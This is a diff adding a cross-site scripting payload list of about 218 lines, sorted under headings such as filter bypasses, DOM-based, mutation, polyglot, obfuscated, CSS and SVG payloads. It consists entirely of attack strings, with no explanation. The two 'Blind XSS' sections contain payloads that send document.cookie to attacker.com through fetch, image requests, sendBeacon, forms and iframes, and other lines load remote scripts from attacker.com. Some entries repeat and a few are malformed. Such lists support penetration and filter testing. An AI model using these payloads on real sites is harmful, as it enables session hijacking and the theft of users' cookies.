@@ -1,0 +1,218 @@
+<script>alert(1)</script>
+<img src="x" onerror="alert(1)">
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<a href="javascript:alert(1)">Click</a>
+"><script>alert(1)</script>
+"><img src="x" onerror="alert(1)">
+<script>confirm(document.cookie)</script>
+<img src=x onerror=alert(document.cookie)>
+<body onload=alert(1)>
+Filter Bypasses
+<script>/*</script><script>alert(1)//*/</script>
+<sCrIpT>alert(1)</sCrIpT>
+<img sRc=x onError=alert(1)>
+<svg/Onload=alert(1)>
+<svg><style>@import"javascript:alert(1)";</style></svg>
+<img """><script>alert(1)</script>">
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+"><svg/onload=alert(1)>
+<marquee><img src=x onerror=alert(1)></marquee>
+<input autofocus onfocus=alert(1)>
+DOM-based XSS
+#<script>alert(1)</script>
+javascript:alert(1)
+<img src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<a href="javascript:alert(1)">Click</a>
+document.write("<img src=x onerror=alert(1)>")
+window.location="javascript:alert(1)"
+<input value="javascript:alert(1)">
+window.location.hash = "#<script>alert(1)</script>"
+"><script>alert(document.URL)</script>
+Advanced Filters Evasion
+';alert(1);//
+"onmouseover="alert(1)">
+<div style="background:url(javascript:alert(1))">
+<body background="javascript:alert(1)">
+<object data="javascript:alert(1)"></object>
+<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>Click me</a>
+<link rel="stylesheet" href="data:text/css,@import 'javascript:alert(1)';">
+<meta http-equiv="refresh" content="0; url=javascript:alert(1)">
+<script src=data:text/javascript,alert(1)></script>
+<embed src="data:text/html,<script>alert(1)</script>"></embed>
+HTML5 Features
+<audio src="javascript:alert(1)">
+<video><source onerror="javascript:alert(1)"></video>
+<details open ontoggle=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<meter onmouseover="alert(1)">
+<progress onmouseover="alert(1)">
+<template><img src=x onerror=alert(1)></template>
+<track src="javascript:alert(1)">
+<picture><img src=x onerror=alert(1)></picture>
+<object type="image/svg+xml" data="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E"></object>
+Mutation XSS
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<math><mtext><script>alert(1)</script></mtext></math>
+document.write('<script>alert(1)</script>')
+<a href="data:text/html,<script>alert(1)</script>">Click</a>
+<iframe src=javascript:alert(1)>
+<form action=javascript:alert(1)>
+<meta charset="x"><script>alert(1)</script>
+<style>@import'javascript:alert(1)';</style>
+<script src="data:text/javascript,alert(1)"></script>
+<input value="''><img src=x onerror=alert(1)>">
+Blind XSS Payloads (requires exfiltration)
+<script>fetch('https://example.com?cookie='+document.cookie)</script>
+<img src='https://attacker.com/?cookie='+document.cookie>
+<script>new Image().src='https://attacker.com/log?key='+document.cookie</script>
+<script>document.location='https://attacker.com/log?cookie='+document.cookie</script>
+<iframe src="https://attacker.com/log?cookie='+document.cookie"></iframe>
+<script>document.write('<img src="https://attacker.com/log?cookie='+document.cookie+'">')</script>
+<link rel="prefetch" href="https://attacker.com/?cookie='+document.cookie>
+<form action="https://attacker.com/log" method="POST"><input type="hidden" name="cookie" value="'+document.cookie+'"></form>
+<a href="https://attacker.com/?key='+document.cookie>Click here</a>
+<script>navigator.sendBeacon('https://attacker.com/log', 'cookie='+document.cookie)</script>
+Polyglot Payloads
+"><script>alert(1)</script><!--
+--><script>alert(1)//
+<script>alert(1)</script><!--
+';alert(1)//
+javascript:alert(1);
+<img src=x onerror="javascript:alert(1)">
+'"><svg onload=alert(1)>
+"onmouseover="alert(1)">
+"><input value="''><img src=x onerror=alert(1)>">
+";alert(1);
+Payloads for Event Handlers
+<button onclick=alert(1)>Click Me</button>
+<img src=x onerror=alert(1) onmouseover=alert(2)>
+<input type="text" onfocus=alert(1)>
+<div onmouseenter=alert(1)>Hover me</div>
+<input type="button" value="Click" onclick="alert(1)">
+<img src="#" onerror="this.onerror=null; alert(1)">
+<a href="#" onmouseover="alert(1)">Hover me</a>
+<body onload=alert(1)>
+<select onchange="alert(1)"><option>Test</option></select>
+<textarea oninput=alert(1)>
+Obfuscated XSS Payloads
+<script>\u0061lert(1)</script>
+<svg/onload=\u0061lert(1)>
+ja\x76ascript:alert(1)
+<img src=\x22x\x22 onerror=alert(1)>
+<svg\x0aonload=alert(1)>
+<script>$u0061lert(1)</script>
+<iframe src=data:text/html,<script>alert(1)</script>>
+<meta http-equiv="refresh" content="0; URL=javascript:alert(1)">
+<script>\x61lert(1)</script>
+';alert(String.fromCharCode(49));//
+<script src="http://attacker.com/xss.js"></script>
+<iframe src="javascript:alert(1)"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(2)</script></svg>
+<input type="hidden" value='"<img src=x onerror=alert(1)>">
+<div><script>alert(1)</script></div>
+<img src=x onerror="prompt(1)">
+<input onmouseover="alert(1)" autofocus>
+javascript:window
+<form onsubmit=alert(1)><input type=submit>
+<iframe src=javascript:prompt(1)>
+HTML Attribute-Based XSS
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<img src=x onevent="alert(1)">
+<audio onerror="alert(1)" src="invalidfile.mp3"></audio>
+<input value="<script>alert(1)</script>">
+<button formaction="javascript:alert(1)">Click Me</button>
+<details open ontoggle="alert(1)"></details>
+<a href="javascript:void(alert(1))">Click Me</a>
+<div onclick="alert(1)">Click Me</div>
+<link rel="stylesheet" href="javascript:alert(1)">
+<a href="#" onclick="alert(1)">Click me</a>
+Nested Tags and Event Attributes
+<svg><a href="javascript:alert(1)">Click</a></svg>
+<textarea autofocus onfocus=alert(1)>test</textarea>
+<embed src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>">
+<input type="text" value="<img src=x onerror=alert(1)">">
+<iframe onload="alert(1)">
+<object type="text/html" data="data:text/html,<script>alert(1)</script>"></object>
+<body oncopy="alert(1)">Test</body>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
+<img src="x" onerror="location='javascript:alert(1)'">
+<input type="image" src="x" onerror="alert(1)">
+CSS Injection and CSS Exploitation XSS
+<style>*{background:url(javascript:alert(1))}</style>
+<div style="background:url(javascript:alert(1))">test</div>
+<link rel="stylesheet" href="data:text/css,*{background:url(javascript:alert(1))}">
+<style>@import "javascript:alert(1)";</style>
+<div style="width:expression(alert(1))">test</div>
+<svg><style>@import url("javascript:alert(1)")</style></svg>
+<meta name="description" content="<style>body{background:url(javascript:alert(1))}</style>">
+<link rel="stylesheet" href="data:text/css;base64,Ym9keXt3aWR0aDphdXRvO30=">
+<style>body{background:url('data:text/html,<script>alert(1)</script>')}</style>
+<div style="filter:url('data:text/html,<script>alert(1)</script>')">XSS</div>
+Advanced DOM-Based XSS
+document.body.innerHTML = "<img src=x onerror=alert(1)>";
+document.write('<iframe src="javascript:alert(1)"></iframe>');
+document.location="javascript:alert(1)";
+window.name="<script>alert(1)</script>";
+setTimeout("alert(1)", 500);
+eval("alert(1)");
+window['location']['hash'] = "#<img src=x onerror=alert(1)>";
+location.assign("javascript:alert(1)")
+document.cookie.split(";")[0].split("=")[1]
+document.URL="javascript:alert(1)";
+Filter Evasion and Bypass XSS
+</textarea><img src="x" onerror="alert(1)">
+<sCrIpT>alert(1)</sCrIpT>
+<svg/onload=alert(1)>
+<form><button formaction="javascript:alert(1)">Click</button></form>
+<body/onpageshow="alert(1)">
+';alert(1);"
+<img src="\" onerror="alert(1)">
+<div data-value='"><img src="x" onerror=alert(1)>">
+<script src=//attacker.com/xss.js></script>
+<style>@-webkit-keyframes x{}</style><img src=x onerror=alert(1)>
+Obfuscation and Encoded Payloads
+<script>\x61lert(1)</script>
+<img src=\x22x\x22 onerror=alert(1)>
+<script>\x77indow.alert(1)</script>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<img src="data:image/png;base64," onerror="alert(1)">
+<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>Click here</a>
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#X27;;alert(1)//
+&#x3Cimg src=&#x22x&#x22 onerror=alert(1)&#x3E
+<img src=x onerror=String.fromCharCode(97,108,101,114,116)(1)>
+SVG and XML XSS Payloads
+<svg><script>alert(1)</script></svg>
+<svg onload="alert(1)"></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><animate onbegin=alert(1)></animate></svg>
+<svg><a xlink:href="javascript:alert(1)">Click</a></svg>
+<xml><script>alert(1)</script></xml>
+<math><mtext><script>alert(1)</script></mtext></math>
+<svg><foreignObject><input xmlns="http://www.w3.org/1999/xhtml" value="<script>alert(1)</script>"></foreignObject></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+<svg><style>@import'javascript:alert(1)';</style></svg>
+Blind XSS Payloads
+<script>fetch('https://attacker.com?c='+document.cookie)</script>
+<img src='https://attacker.com/?c='+document.cookie>
+<script>new Image().src='https://attacker.com/log?cookie='+document.cookie</script>
+<iframe src="https://attacker.com/log?cookie='+document.cookie"></iframe>
+<script>navigator.sendBeacon('https://attacker.com/log', 'cookie='+document.cookie)</script>
+<script>document.location='https://attacker.com/log?cookie='+document.cookie</script>
+<a href="https://attacker.com/?c='+document.cookie>Click Here</a>
+<script>new Image().src='https://attacker.com/log?data='+document.location</script>
+<form action="https://attacker.com/log"><input type="hidden" name="cookie" value="'+document.cookie+'"></form>
+<iframe src="https://attacker.com/log?hash='+document.location.hash"></iframe>
+Polyglot Payloads
+javascript:alert(document.domain)
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<form><input value="</form><script>alert(1)</script>">
+<input value='" onmouseover="alert(1)">
+<input value='' onfocus="alert(1)">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<div onmouseover=alert(1)>Mouse over</div>
+<a href="javascript://%0Aalert(1)">Click me</a>
